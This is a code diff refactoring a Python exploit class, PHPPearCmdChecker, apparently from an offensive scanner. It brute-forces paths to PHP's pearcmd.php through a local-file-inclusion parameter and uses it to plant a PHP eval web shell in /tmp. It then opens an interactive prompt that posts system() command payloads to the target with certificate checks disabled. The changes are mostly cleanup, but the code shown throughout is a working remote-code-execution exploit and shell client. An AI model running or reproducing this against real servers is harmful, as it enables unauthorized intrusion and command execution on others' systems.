@@ -2,30 +2,24 @@ import os
 import re
 import ssl
 import socket
-import requests
 import urllib.parse
 
-from rich.console import Console
+import requests
+
 from rich.progress import Progress
-from prompt_toolkit import PromptSession
-from prompt_toolkit.formatted_text import HTML
-from prompt_toolkit.history import InMemoryHistory
-from urllib3.exceptions import InsecureRequestWarning
 from concurrent.futures import ThreadPoolExecutor
 
-requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+from core.base import BaseChecker, wordlist_path
 
 
-class PHPPearCmdChecker():
+class PHPPearCmdChecker(BaseChecker):
     def __init__(self, url, silent=False, threads=300):
+        super().__init__(url, silent)
+        # Override: pearcmd uses raw sockets, keep the original url as-is
         self.url = url
         self.threads = threads
         self.param_name = None
-        self.silent = silent
-        self.console = Console()
-        self.PEARCMD_FILEPATHS = self.load_file_paths(
-            os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'wordlists', 'pearcmd.txt')
-        )
+        self.PEARCMD_FILEPATHS = self.load_file_paths(wordlist_path('pearcmd.txt'))
 
     def load_file_paths(self, filepath):
         file_path = []
@@ -83,20 +77,18 @@ class PHPPearCmdChecker():
                     else:
                         break
                 break
-            except ssl.SSLError as e:
+            except ssl.SSLError:
                 if verify_ssl:
                     continue
                 else:
-                    self.console.print("\nError while sending request:", e)
+                    self.console.print("\nSSL Error while sending request.")
                     response = None
-            except Exception as e:
-                self.console.print("\nError while sending request:", e)
+            except Exception as exc:
+                self.console.print(f"\nError while sending request: {exc}")
                 response = None
             if response is not None:
                 break
         return response
-
-
 
     def _scan(self, params, file_paths, parsed_url, progress=None):
         shared_results = []
@@ -122,19 +114,19 @@ class PHPPearCmdChecker():
                     shared_results.append(True)
                     self.file_path = file_path
                     self.param_name = param_name
-                    return True  
+                    return True
                 if progress:
                     progress.update(task, advance=1)
-                return False  
+                return False
             except requests.exceptions.ConnectionError:
                 connection_error_count += 1
                 if connection_error_count >= 10:
                     stop_signal = True
-                return False    
+                return False
 
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             futures = [executor.submit(send_request, file_path, param_name)
-                    for file_path in file_paths for param_name in params.keys()]
+                       for file_path in file_paths for param_name in params.keys()]
 
             for future in futures:
                 if stop_signal:
@@ -148,7 +140,6 @@ class PHPPearCmdChecker():
                     stop_signal = True
                     break
 
-
         if any(shared_results):
             print_message = True
 
@@ -160,9 +151,8 @@ class PHPPearCmdChecker():
 
         return any(shared_results), self.param_name
 
-
-
     def run_shell(self, param_name):
+        """Custom shell - pearcmd writes a PHP eval shell to /tmp, then POSTs commands."""
         self.silent = True
         parsed_url = urllib.parse.urlparse(self.url)
         params = urllib.parse.parse_qs(parsed_url.query)
@@ -173,14 +163,18 @@ class PHPPearCmdChecker():
         new_query = '&'.join([f'{k}={v}' for k, v in new_params.items()])
         fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
         use_ssl = parsed_url.scheme == "https"
-        headers = { 'User-Agent': 'Mozilla/5.0' }
+        headers = {'User-Agent': 'Mozilla/5.0'}
 
         try:
-            response = self._send_raw_request(fuzzed_url, headers=headers, use_ssl=use_ssl)
-        except Exception as e:
+            self._send_raw_request(fuzzed_url, headers=headers, use_ssl=use_ssl)
+        except Exception as exc:
             self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
-            print(e)
+            print(exc)
             return False, None
+
+        from prompt_toolkit import PromptSession
+        from prompt_toolkit.formatted_text import HTML
+        from prompt_toolkit.history import InMemoryHistory
 
         for _ in range(2):
             for filename in filenames:
@@ -193,35 +187,28 @@ class PHPPearCmdChecker():
                     try:
                         response = self._send_raw_request(fuzzed_url, method='POST', headers=headers, use_ssl=use_ssl, data=data)
                         match = re.search(r'\[S\](.*?)\[E\]', response)
-                        #print(response)
                         if match:
                             session = PromptSession(history=InMemoryHistory())
                             while True:
                                 try:
                                     cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
-
-                                    if "exit" in cmd:
-                                        raise KeyboardInterrupt
-                                    elif not cmd:
+                                    if not cmd:
                                         continue
-                                    elif "clear" in cmd:
-                                        if os.name == 'posix':
-                                            os.system('clear')
-                                        elif os.name == 'nt':
-                                            os.system('cls')              
-                                    if cmd.lower() in ["exit", "quit"]:
-                                        break
+                                    if cmd.strip().lower() in ("exit", "quit"):
+                                        raise KeyboardInterrupt
+                                    if cmd.strip().lower() in ("clear", "cls"):
+                                        os.system("cls" if os.name == "nt" else "clear")
+                                        continue
 
                                     cmd = f"test=echo('[S]');system('{cmd}');echo('[E]');"
-                                    
+
                                     attempts = 5
-                                    for _ in range(attempts):
+                                    for attempt in range(attempts):
                                         try:
                                             response = requests.post(fuzzed_url, headers=headers, data=cmd, verify=False)
-                                            #print(response.text)
-                                        except Exception as e:
+                                        except Exception as exc:
                                             self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
-                                            print(e)
+                                            print(exc)
 
                                         pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL)
                                         response_content = pattern.search(response.text)
@@ -229,19 +216,18 @@ class PHPPearCmdChecker():
                                             shell_output = response_content.group(1)
                                             self.console.print(f"[bold green]{shell_output}[/bold green]")
                                             break
-                                        elif _ == attempts - 1 and not response_content:
+                                        elif attempt == attempts - 1 and not response_content:
                                             self.console.print("[bold red]No shell output. (Retry because this method is not stable)[/bold red]")
 
                                 except KeyboardInterrupt:
                                     self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
                                     return True, None
 
-                    except Exception as e:
+                    except Exception as exc:
                         self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
-                        print(e)
+                        print(exc)
                         return False, None
         self.console.print("[bold red]Cannot create the shell :([/bold red]")
-
 
 
 def main():
